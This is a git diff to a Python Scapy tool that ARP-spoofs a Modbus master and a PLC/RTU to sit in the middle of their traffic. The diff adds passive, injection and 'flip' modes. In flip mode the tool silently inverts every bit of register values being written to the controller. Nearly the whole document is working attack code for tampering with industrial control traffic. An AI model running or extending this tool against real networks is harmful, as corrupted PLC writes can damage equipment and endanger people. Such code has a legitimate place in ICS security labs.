@@ -22,7 +22,7 @@ from datetime import datetime, timezone
 
 try:
     from scapy.all import (
-        sniff, sr1, ARP, Ether, TCP, IP, conf, get_if_hwaddr,sendp,srp1,sr
+        sniff, sr1, ARP, Ether, TCP, IP, conf, get_if_hwaddr,sendp,srp1,sr,srp
     )
     from scapy.contrib.modbus import (
     ModbusADURequest,
@@ -65,7 +65,6 @@ def get_mac(ip, iface, timeout=3): #TODO: remove iface parameter
     ans = sr1(ARP(op=1, pdst=ip), timeout=timeout,  verbose=0)
     return ans[ARP].hwsrc if ans else None
 
-
 def arp_spoof_loop(iface, victim_ip, victim_mac, target_ip, target_mac, own_mac, stop_event, interval=2):
     while not stop_event.is_set():
         # Tell victim that we are the target
@@ -79,7 +78,6 @@ def arp_spoof_loop(iface, victim_ip, victim_mac, target_ip, target_mac, own_mac,
         sendp(pkt1, iface=iface, verbose=0)
         sendp(pkt2, iface=iface, verbose=0)
         stop_event.wait(interval)
-
 
 def restore_arp(iface, victim_ip, victim_mac, target_ip, target_mac):
     # Send correct mappings a few times to overwrite the poisoned entries
@@ -117,11 +115,11 @@ def is_retransmission(pkt):
         seen_seqs[key] = set()
 
     if seq in seen_seqs[key]:
-        print(f"Retransmission detected: {key} seq={seq}")
+        #print(f"Retransmission detected: {key} seq={seq}")
         return True
     else:
         seen_seqs[key].add(seq)
-        print(f"Not a retransmission: {key} seq={seq}")
+        #print(f"Not a retransmission: {key} seq={seq}")
         return False
 
 def print_modbus_payload(mb):
@@ -170,7 +168,6 @@ def interactive_packet_craft():
 
     return(build_pdu(func_choice))
 
-
 def build_pdu(func_code: int):
     if func_code in (0x01, 0x02, 0x03, 0x04):
         # All read requests share the same two fields
@@ -215,10 +212,13 @@ def build_pdu(func_code: int):
 
     raise ValueError(f"No PDU builder implemented for function code {func_code}")
 
+def flip_all_bits(value: int, width: int = 16) -> int:
+    mask = (1 << width) - 1  # e.g. 0xFFFF for 16-bit
+    return value ^ mask
 
-def handle_packet(pkt, port, log_file,mappings,own_mac,crafted_pkt):
+def handle_packet(pkt, port, log_file,mappings,own_mac,mode,crafted_pkt):
     is_custom=False
-    if crafted_pkt!="":
+    if crafted_pkt!="" and mode=="injection":
         is_custom=True
     src = own_mac
     dst = pkt[IP].dst 
@@ -229,6 +229,15 @@ def handle_packet(pkt, port, log_file,mappings,own_mac,crafted_pkt):
     pkt[Ether].src=src
     pkt[Ether].dst=mappings[dst]
 
+
+
+    if pkt.haslayer(ModbusADUResponse):
+        if not is_retransmission(pkt):
+            print("Got a modbus response")
+            print_modbus_payload(pkt[ModbusADUResponse])
+            sendp(pkt,loop=0,inter=0.2,verbose=0)
+            return
+        
 
     if pkt.haslayer(ModbusADURequest):
         if is_retransmission(pkt):
@@ -244,10 +253,10 @@ def handle_packet(pkt, port, log_file,mappings,own_mac,crafted_pkt):
     direction = "req " if tcp.dport == port else "resp"
     src = f"{pkt[IP].src}:{tcp.sport}"
     dst = f"{pkt[IP].dst}:{tcp.dport}"
-    log_line(f"{direction} {src:>21} -> {dst:<21}", log_file)
+    #log_line(f"{direction} {src:>21} -> {dst:<21}", log_file)
 
-    if is_custom:
-        print("Crafting custom packet")
+    if mode=="injection":
+        print("Crafting custom packet...")
         trans_id = pkt[ModbusADURequest].transId
         unit_id = pkt[ModbusADURequest].unitId
 
@@ -256,26 +265,40 @@ def handle_packet(pkt, port, log_file,mappings,own_mac,crafted_pkt):
         modbus_payload = ModbusADURequest(transId=trans_id, unitId=unit_id) / crafted_pkt
 
         pkt = stripped / modbus_payload
-    else: # just sniffing traffic
+        print("\nCrafted Packet: ")
+        print(pkt.show(dump=True))
+
+    elif mode=="passive": # just sniffing traffic
         print("\nRequest Recieved:")
         print_modbus_payload(pkt[ModbusADURequest])    
         print("-"*16)
+
+    elif mode=="flip": #bit flip register values
+        if hasattr(pkt[ModbusADURequest],"registerValue"):
+            print_modbus_payload(pkt[ModbusADURequest]) 
+            print("\nFlipped value: ", flip_all_bits(pkt[ModbusADURequest].registerValue,width=16))
+            pkt[ModbusADURequest].registerValue = flip_all_bits(pkt[ModbusADURequest].registerValue,width=16)
+        else:
+            print("Request does not have a register value.")
     del pkt[TCP].chksum
     del pkt[IP].chksum
 
     # print(npkt.show(dump=True))
     # sendp(npkt,loop=0,inter=0.2,verbose=0) #try making this send and recieve to analysis the response
-    response = srp1(pkt, timeout=3, verbose=0)
-    if response:
-        print("\nResponse received:")
-        # response.show()
-        if response.haslayer(ModbusADUResponse):
-            print_modbus_payload(response[ModbusADUResponse])
-            print("-"*16)
-        else:
-            print("Missing ModbusADUResponse layer...")
-    else:
-        print("No response — device may be down, dropping packets, or filtering the request")
+    response = sendp(pkt, verbose=0)
+    # if response:
+    #     print("\nResponse received:")
+    #     # response.show()
+    #     if response.haslayer(ModbusADUResponse):
+    #         print_modbus_payload(response[ModbusADUResponse])
+    #         print("-"*16)
+    #     else:
+    #         print("Missing ModbusADUResponse layer...")
+    #         print(response.show(dump=True))
+    # else:
+    #     print("No response — device may be down, dropping packets, or filtering the request")
+
+        #IS IT A PACKET LENGTH ISSUE???????????
 
 def banner():
     print(f'''                                                                                                 
@@ -293,7 +316,8 @@ def main():
     ap.add_argument("-t","--target", required=True, help="IP of the Modbus slave (PLC/RTU)")
     ap.add_argument("-p","--port", type=int, default=502, help="Modbus/TCP port (default 502)")
     ap.add_argument("--log", help="Optional path to append decoded output to")
-    ap.add_argument("--injection", type=bool, help="Craft your own Modbus request")
+    ap.add_argument("--mode", required=True, help="Mode to run in (e.g. passive, injection, flip)")
+    
     ap.add_argument("--arp-interval", type=float, default=2.0, help="Seconds between spoofed ARP bursts")
     args = ap.parse_args()
 
@@ -305,14 +329,11 @@ def main():
     log_file = open(args.log, "a") if args.log else None
     stop_event = threading.Event()
 
-
-
     try:
         conf.iface = args.interface
     except Exception as e:
         log_line("[-] Error: "+str(e),log_file)
         exit(1)
-
 
     own_mac = get_if_hwaddr(args.interface) 
     victim_mac = get_mac(args.victim, args.interface)
@@ -322,9 +343,8 @@ def main():
         print("Could not resolve MAC address for victim or target — aborting.", file=sys.stderr)
         sys.exit(1)
 
-
-    log_line(f"Resolved victim {args.victim} -> {victim_mac}", log_file)
-    log_line(f"Resolved target {args.target} -> {target_mac}", log_file)
+    # log_line(f"Resolved victim {args.victim} -> {victim_mac}", log_file)
+    # log_line(f"Resolved target {args.target} -> {target_mac}", log_file)
 
     spoof_thread = threading.Thread(
         target=arp_spoof_loop,
@@ -332,11 +352,22 @@ def main():
         daemon=True,
     )
     spoof_thread.start()
-    log_line("ARP spoofing started — traffic between victim and target now routes through this host.", log_file)
+    # log_line("ARP spoofing started — traffic between victim and target now routes through this host.", log_file)
 
     crafted_pkt=""
-    if args.injection:
-        crafted_pkt = interactive_packet_craft()
+    mode = (args.mode).lower()
+
+    match mode:
+        case "passive":
+            print("Passive Mode")
+        case "injection":
+            print("Injection Mode")
+            crafted_pkt = interactive_packet_craft()
+        case "flip":
+            print("Flip Mode")
+        case _:
+            print("No mode selected, exiting") #this should be impossible
+            exit(1)
 
     bpf_filter = f"tcp port {args.port} and (host {args.victim} or host {args.target}) and not ether src {own_mac}" 
 
@@ -345,11 +376,11 @@ def main():
 
     try:
         sniff(iface=args.interface, filter=bpf_filter,
-              prn=lambda p: handle_packet(p, args.port, log_file,mappings,own_mac,crafted_pkt), store=False)
+              prn=lambda p: handle_packet(p, args.port, log_file,mappings,own_mac,mode,crafted_pkt), store=False)
     except KeyboardInterrupt:
         pass
     finally:
-        log_line("Stopping — restoring ARP tables and disabling forwarding.", log_file)
+        log_line("Stopping — restoring ARP tables.", log_file)
         stop_event.set()
         spoof_thread.join(timeout=2)
         restore_arp(args.interface, args.victim, victim_mac, args.target, target_mac)
